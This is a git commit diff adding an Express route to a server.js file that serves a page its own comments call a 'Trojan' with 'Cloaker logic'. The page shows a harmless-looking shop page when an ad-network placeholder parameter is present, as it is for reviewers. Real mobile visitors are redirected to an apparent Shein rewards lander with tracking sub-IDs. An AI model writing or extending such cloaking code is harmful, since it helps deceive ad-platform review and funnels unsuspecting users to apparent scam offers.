51a7f484a9311edf3ed842239b70b200d8444a96
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-06-10 15:19:38 -0400

    Update server.js

--- server.js
+++ server.js
@@ -871,6 +871,39 @@ app.get('/twshein/:slug', (req, res, next) => {
             console.log(`Served twshein Trojan (tyler)(${slug})`);
 });
 
+// Middleware to pass on Tyler's SubIDs MY LANDER SHEIN GLITCHY
+app.get('/twshein2/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://realrewardshub.com/twshein2.html?sub=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
+
 // Middleware to pass on Tyler's Germany Shopify
 app.get('/germany/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
